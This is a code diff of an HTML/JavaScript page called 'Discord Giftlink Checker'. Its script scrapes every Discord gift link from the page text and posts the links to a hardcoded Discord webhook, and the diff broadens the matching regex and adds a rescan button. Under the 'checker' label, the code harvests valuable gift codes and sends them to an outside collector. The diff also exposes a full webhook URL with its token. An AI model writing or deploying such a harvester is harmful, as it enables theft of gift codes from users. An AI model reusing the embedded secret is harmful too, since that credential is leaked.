@@ -52,12 +52,27 @@
             background-color: #d1ecf1;
             color: #0c5460;
         }
+        .button {
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .button:hover {
+            background-color: #4752C4;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Discord Giftlink Checker</h1>
-        <p>This tool automatically scans the page for Discord gift links and sends them to a predefined webhook.</p>
+        <p>This tool scans the page for Discord gift links and sends them to a predefined webhook.</p>
+        
+        <button class="button" onclick="scanForGiftLinks()">Scan Again</button>
         
         <div id="status" class="status info">Scanning for gift links...</div>
         
@@ -68,7 +83,8 @@
     <script>
         // Configuration
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1535632574624432208/5HY97CzhCjZ_dpd3Tv2uLtkcrsoNFpr3XNJqLDQ9_FIaBUENAuE89TaA4m-wkRWzwEj3";
-        const DISCORD_GIFT_LINK_REGEX = /https:\/\/discord\.gift\/[A-Za-z0-9]+/g;
+        // Updated regex to match more gift link formats
+        const DISCORD_GIFT_LINK_REGEX = /(https?:\/\/)?(discord\.gift|discordapp\.com\/gift)\/[A-Za-z0-9]+/g;
         
         // Rate limiting: Minimum delay between webhook sends (in milliseconds)
         const RATE_LIMIT_DELAY = 2000;
@@ -167,8 +183,13 @@
             const allText = document.body.textContent || document.body.innerText;
             const matches = allText.match(DISCORD_GIFT_LINK_REGEX) || [];
             
-            // Extract unique links
-            const uniqueLinks = [...new Set(matches)];
+            // Extract unique links and normalize them (add https:// if missing)
+            const uniqueLinks = [...new Set(matches)].map(link => {
+                if (!link.startsWith("http://") && !link.startsWith("https://")) {
+                    return `https://${link}`;
+                }
+                return link;
+            });
             
             if (uniqueLinks.length === 0) {
                 updateStatus("No gift links found.", "error");
